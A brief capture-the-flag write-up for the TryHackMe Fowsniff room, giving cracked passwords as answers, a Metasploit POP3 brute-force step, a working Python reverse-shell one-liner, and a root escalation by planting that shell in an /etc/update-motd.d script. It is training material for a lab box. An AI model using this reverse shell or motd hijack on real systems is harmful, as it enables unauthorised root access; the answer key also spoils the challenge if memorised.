# TryHackMe Fowsniff

# Saikat Karmakar | Jan 13:2021

# Task 1
1. What was seina's password to the email service?
```
scoobydoo2 
```
2. Looking through her emails, what was a temporary password set for her?
```
S1ck3nBluff+secureshell
```


***Notes***
```
awk -F'@' '{print $1}' fowsniff.txt > users.txt

sed -n 's/.*://p' cracked.txt > pass.txt
```

use auxiliary/scanner/pop3/pop3_login to bruteforce the pop3
```
user = seina
pass = scoobydoo2
```
ssh creds
```
user = baksteen
pass = S1ck3nBluff+secureshell
```


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.23.120",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

put the rev shell in the cube.sh as we can see in the /etc/update-motd.d/ folder that the file run as root evertytime a user logs in via SSH


flag
```
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```